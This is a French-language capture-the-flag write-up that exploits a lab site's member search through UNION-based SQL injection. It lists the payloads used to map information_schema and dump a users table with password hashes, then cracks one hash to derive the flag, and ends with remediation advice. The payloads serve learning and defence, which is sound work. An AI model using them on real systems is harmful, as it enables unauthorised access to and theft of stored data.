dans la page member, on remarque qu’on cherche un id d’utilisateur. Si on entre autre chose qu’un nombre, par exemple test, on reçoit une erreur Unknown column 'test' in 'where clause'. On comprend donc vite que le champ saisi est injecté dans une requête SQL.
Si on entre un nombre, par exemple 0, il ne se passe rien. Je comprends donc que la requête est bien formatée.
En SQL, après une clause WHERE, il peut y avoir plusieurs choses. Un UNION serait parfait pour nous ; seulement, dans un UNION, la requête A et la requête B doivent avoir le même nombre de colonnes.
Pour trouver le nombre de colonnes, j’ai simplement fait un ORDER BY 1 (ORDER BY peut fonctionner avec le nom de la colonne mais aussi avec son numéro) et là je tombe sur :
id : 1
ORDER BY 1
First name : one
Surname : me
Je sais maintenant qu’il y a 2 colonnes. Je ne connais pas encore le nom de la table ni le nom des colonnes dans cette (ou ces) table(s).
Si on fait :
1 union SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = DATABASE() ORDER BY 1,2 
Nous voilà avec nos informations :
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
ID: 1 union SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = DATABASE() ORDER BY 1,2  
First name: one
Surname : me

ID: 1 union SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = DATABASE() ORDER BY 1,2  
First name: users
Surname : Commentaire

ID: 1 union SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = DATABASE() ORDER BY 1,2  
First name: users
Surname : countersign

ID: 1 union SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = DATABASE() ORDER BY 1,2  
First name: users
Surname : country

ID: 1 union SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = DATABASE() ORDER BY 1,2  
First name: users
Surname : first_name

ID: 1 union SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = DATABASE() ORDER BY 1,2  
First name: users
Surname : last_name

ID: 1 union SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = DATABASE() ORDER BY 1,2  
First name: users
Surname : planet

ID: 1 union SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = DATABASE() ORDER BY 1,2  
First name: users
Surname : town

ID: 1 union SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = DATABASE() ORDER BY 1,2  
First name: users
Surname : user_id
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
La première réponse correspond aux informations avant l’UNION.
Ensuite, on se rend compte qu’il n’y a qu’une seule table dans la base de données : users.
Cette table contient les colonnes suivantes :

Commentaire
countersign
country
first_name
last_name
planet
town
user_id

Comme je ne peux pas utiliser les guillemets simples ('), je ne pourrai pas faire un LISTAGG propre. 
Je vais donc extraire chaque colonne manuellement avec l’id afin de reconstruire la table.

1 union select user_id, Commentaire from users
1 union select user_id, countersign from users
1 union select user_id, country from users
1 union select user_id, first_name from users
1 union select user_id, last_name from users
1 union select user_id, planet from users
1 union select user_id, town from users

on a donc une table comme ca : 


users_id    | Commentaire                               | countersign                       | country   | first_name    | last_name     | planet    | town

1           | Je pense, donc je suis                    | 2b3366bcfd44f540e630d4dc2b9b06d9  | France    | one           | me            | Earth     | Paris
2           | Aamu on iltaa viisaampi.                  | 60e9032c586fb422e2c16dee6286cf10  | Finlande  | two           | me            | Earth     | Helsinki
3           | Dublin is a city of stories and secrets.  | e083b24a01c483437bcf4a9eea7c1b4d  | Irlande   | three         | me            | Earth     | Dublin
5           | Decrypt this password -> 
              then lower all the char. 
              Sh256 on it and it's good !               | 5ff9d0165b4f92b14994e5c685cdce28  | 42        | Flag          | GetThe        | 42        | 42


Decrypt this password -> then lower all the char. Sh256 on it and it's good ! 

Si je décrypte ça en MD5, je tombe sur : FortyTwo
Je le mets en minuscule : fortytwo
Ensuite, je l’encrypte en SHA-256 et voilà le flag :
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

Plusieurs choses peuvent être appliquées. La première, c’est d’empêcher que des données utilisateur deviennent du code. Utilise partout des requêtes paramétrées plutôt que de construire des chaînes SQL à la main.
Donne à ton compte SQL des droits minimaux (pas de DROP, pas d’ALTER si inutile) et sépare les rôles lecture/écriture. Ne renvoie jamais les messages d’erreur SQL au client.
Enlever certains caractères peut être une solution radicale, mais elle n’est pas toujours suffisante.